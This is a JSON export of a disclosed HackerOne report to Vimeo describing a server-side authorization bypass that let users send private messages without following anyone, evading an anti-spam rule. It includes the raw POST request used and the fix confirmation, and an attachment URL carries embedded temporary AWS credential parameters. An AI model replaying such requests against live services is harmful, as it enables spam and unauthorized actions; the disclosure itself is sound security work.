{"id":46113,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NjExMw==","url":"https://hackerone.com/reports/46113","title":"Can message users without the proper authorization","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-02-02T12:21:16.460Z","submitted_at":"2015-02-02T12:21:16.460Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jkjkjk","url":"/jkjkjk","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/016/927/2e2cb58aa77d9ba23b116f6ea1548985940f22ec_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":56,"url":"https://hackerone.com/vimeo","handle":"vimeo","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/056/c3188aa0fc4a95fd486b5ee1f4b2d0b90da111d3_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/056/c3188aa0fc4a95fd486b5ee1f4b2d0b90da111d3_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Vimeo","twitter_handle":"vimeo","website":"https://vimeo.com","about":"Make life worth watching"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2015-04-01T14:25:03.844Z","bug_reporter_agreed_on_going_public_at":"2015-03-02T14:25:02.213Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"It shouldn't be possible to send messages to users without following users:\r\n\r\n\u003e You must be following at least one Vimeo member before you can send a private message. To get started, find a friend, family member, or someone with cool videos and click the \"Follow\" button on their profile page. \r\n\r\nIt's possible to bypass that by just sending a POST request to `/messages`:\r\n\r\n```\r\nPOST /messages HTTP/1.1\r\nHost: vimeo.com\r\nUser-Agent: [CENSORED]\r\nAccept: text/html, application/xml, text/xml, */*\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nX-Requested-With: XMLHttpRequest\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\nReferer: https://vimeo.com/messages\r\nContent-Length: 141\r\nCookie: [CENSORED]\r\nConnection: keep-alive\r\nPragma: no-cache\r\nCache-Control: no-cache\r\n\r\nname=Jens\u003e\u0026text=blaat\u0026action=send_message\u0026lightbox=true\u0026user=[ANY USER ID HERE]\u0026token=[CENSORED]\r\n```\r\n\r\nYou can replace the `user` parameter with any random user ID and it will send the message without any issues.\r\n\r\n**Fix:**\r\nAdd proper server side authorization on the `/messages` endpoint.","bounty_amount":"100.0","formatted_bounty":"$100","weakness":{"id":27,"name":"Improper Authentication - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2015-04-01T14:25:03.439Z","allow_singular_disclosure_after":-206066244.4554332,"singular_disclosure_allowed":true,"vote_count":4,"voters":["sw33tlie","eveeez","khizer47","spetr0x"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":326642,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Any sign of life would be appreciated, thanks :)","automated_response":false,"created_at":"2015-02-06T09:39:49.211Z","updated_at":"2015-02-06T09:39:49.211Z","actor":{"username":"jkjkjk","cleared":false,"url":"/jkjkjk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/927/2e2cb58aa77d9ba23b116f6ea1548985940f22ec_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":328929,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"POC video: [http://youtu.be/n0zTCQMWcdQ](http://youtu.be/n0zTCQMWcdQ)","automated_response":false,"created_at":"2015-02-10T10:33:54.873Z","updated_at":"2015-02-10T10:34:49.872Z","actor":{"username":"jkjkjk","cleared":false,"url":"/jkjkjk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/927/2e2cb58aa77d9ba23b116f6ea1548985940f22ec_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":332811,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I don't like nagging people, but I feel a bit like Tom Hanks in Cast Away rambling to Wilson (minus the ragged hair). A response would fix that.","automated_response":false,"created_at":"2015-02-16T14:43:54.045Z","updated_at":"2015-02-16T14:43:54.045Z","actor":{"username":"jkjkjk","cleared":false,"url":"/jkjkjk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/927/2e2cb58aa77d9ba23b116f6ea1548985940f22ec_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":29465,"filename":"castaway_1850515i.jpg","type":"image/jpeg","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/029/465/70afb33f27505974b83ddadfa39e6f9d21fc024d/castaway_1850515i.jpg?response-content-disposition=attachment%3B%20filename%3D%22castaway_1850515i.jpg%22%3B%20filename%2A%3DUTF-8%27%27castaway_1850515i.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXEQ3VCGF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150227Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCNbr25hK1JC2i73IX5uE08m1agZwA%2BCyxTPtXmxpZHFAIgA9v21iU9rOtKWjxfMHo7kqQOL4Y8ABbAnucRVLpaC9cqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDOyim%2FBwzSkIWBPCWirXA1TUfPlTIAz6iDfoaiiMP8hivTDD8uDyRJ%2FoAF5UW%2F6cSrWHj2Mtt%2Fx8tKTYSGoQiyhUdi%2BFdxLY35ZRGqE5k10GcpBa5q9ivBUHzTLtIbzvkVLjo0GDs33RjPyv8lT8%2BIT3cR1GpHz5sKugzk1wJHpaXHIGV7TsNZTez5PsxRWLAbodD46%2Bv0aY9dXICvo8Bld1OIiDoUsI3sX2R7SAEjL0B45opfmY7Hh4KKVF9KyCf7etmcGEL0U%2Bjij5TfmuHRxoVJXFKR4WbBKoHXN3cL5AQhAkGBE5bmE6cTsvfhMkCltMfmR1OmQtt1QK7fs2YWSyJhNNnjgzseVzroJk8qcktNvGQQNtmAz%2F0hi%2BbLDdR3r35MBTZtRPxGxwfYKfk%2Blyikhar%2F%2FfPxr6sJoQhbcKSjiziR8cFwFPC97f3qfgH6sVJVvH5AClhLDj9FMqequ01uI1FMQI%2BQ1BJ1t%2Bl3dX7D09OZCMRrk3HvidiN7al4fmx5e0pKMz7tbb23gSzvgiMJbXeHgATiARA8dz6JIoLosFubesB7ZLWq9owsMVaP42CuihB%2Br9J9vu1HkgY4lcWvgRt8bqCjXjWDPBzlNcnc9D32bMJUDfp2BWdJ0BCnpEi4XjrDCyiJGLBjqlAbw%2BQzzkBo5pgpwg2B9K3Kb9khz80zQhxWTR4UFlyZpApeXe135MxtRrVWf1VeEC8qBZynSiicNEE5qSEPmd%2FKNSihzfYJ9PmbUkfZN9yFsrIArapjiCpWMywbnOVNeLSHMFFv8xtfh0sOTI4VetTtHS5BxyHny%2BvnXM6Hjudg5tfOAvbwkv9j%2BTfq0Y0YGFWvyUNrCeX3Y3zQ5t8ked%2FqOvxUSYeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=7f1276bcef58752f58327c6966491d26adb544df1d218a65fe1e14c67f878d83"}],"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":340516,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I think he might be talking about being able to send messages without having to follow anyone first. This was an anti-spam measure.","automated_response":false,"created_at":"2015-02-26T04:40:02.846Z","updated_at":"2015-02-26T04:40:02.846Z","actor":{"username":"andrewp","cleared":false,"url":"/andrewp","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/966/b9d700976d0952781d36b6dbd46cb36c8ec59da9_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":340517,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2015-02-26T04:40:14.156Z","updated_at":"2015-02-26T04:40:14.156Z","actor":{"username":"andrewp","cleared":false,"url":"/andrewp","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/966/b9d700976d0952781d36b6dbd46cb36c8ec59da9_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":340518,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Well that comment was meant to be private, but we're (finally) looking into it =)","automated_response":false,"created_at":"2015-02-26T04:40:35.097Z","updated_at":"2015-02-26T04:40:35.097Z","actor":{"username":"andrewp","cleared":false,"url":"/andrewp","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/966/b9d700976d0952781d36b6dbd46cb36c8ec59da9_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":340539,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003e I think he might be talking about being able to send messages without having to follow anyone first. \n\nThat is correct :)","automated_response":false,"created_at":"2015-02-26T06:27:15.314Z","updated_at":"2015-02-26T06:27:15.314Z","actor":{"username":"jkjkjk","cleared":false,"url":"/jkjkjk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/927/2e2cb58aa77d9ba23b116f6ea1548985940f22ec_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":340938,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Fixed, going live soon.","automated_response":false,"created_at":"2015-02-26T17:01:09.349Z","updated_at":"2015-02-26T17:01:09.349Z","actor":{"username":"andrewp","cleared":false,"url":"/andrewp","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/966/b9d700976d0952781d36b6dbd46cb36c8ec59da9_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"jkjkjk","url":"/jkjkjk"},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":341216,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Great, let me know when it's deployed so I can verify it.","automated_response":false,"created_at":"2015-02-26T20:36:17.311Z","updated_at":"2015-02-26T20:36:26.751Z","actor":{"username":"jkjkjk","cleared":false,"url":"/jkjkjk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/927/2e2cb58aa77d9ba23b116f6ea1548985940f22ec_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":341235,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"```\nHTTP/1.1 401 Unauthorized\n\n{\"display_message\":\"You are unauthorized for this action.\"}\n```\n\nLooks good! I can verify this doesn't work anymore. Let me know if Authorization Bypass reports are eligible for a bounty.","automated_response":false,"created_at":"2015-02-26T20:56:36.730Z","updated_at":"2015-02-26T20:56:36.730Z","actor":{"username":"jkjkjk","cleared":false,"url":"/jkjkjk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/927/2e2cb58aa77d9ba23b116f6ea1548985940f22ec_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":344258,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Can you answer my previous question too? Thanks.","automated_response":false,"created_at":"2015-03-02T14:25:02.322Z","updated_at":"2015-03-02T14:25:02.322Z","first_to_agree":true,"actor":{"username":"jkjkjk","cleared":false,"url":"/jkjkjk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/927/2e2cb58aa77d9ba23b116f6ea1548985940f22ec_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":350847,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Please reply.","automated_response":false,"created_at":"2015-03-11T06:41:04.405Z","updated_at":"2015-03-11T06:41:04.405Z","actor":{"username":"jkjkjk","cleared":false,"url":"/jkjkjk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/927/2e2cb58aa77d9ba23b116f6ea1548985940f22ec_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":353420,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"^","automated_response":false,"created_at":"2015-03-13T10:21:36.972Z","updated_at":"2015-03-13T10:21:36.972Z","actor":{"username":"jkjkjk","cleared":false,"url":"/jkjkjk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/927/2e2cb58aa77d9ba23b116f6ea1548985940f22ec_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":367395,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2015-04-01T14:25:04.132Z","updated_at":"2015-04-01T14:25:04.132Z","actor":{"url":"/vimeo","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/056/c3188aa0fc4a95fd486b5ee1f4b2d0b90da111d3_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Vimeo"}},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1430263,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2017-01-19T15:04:51.691Z","updated_at":"2017-01-19T15:04:51.691Z","actor":{"url":"/vimeo","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/056/c3188aa0fc4a95fd486b5ee1f4b2d0b90da111d3_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Vimeo"}},"bounty_amount":"100.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"vimeo","collaborator":{"username":"jkjkjk","url":"/jkjkjk"},"actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}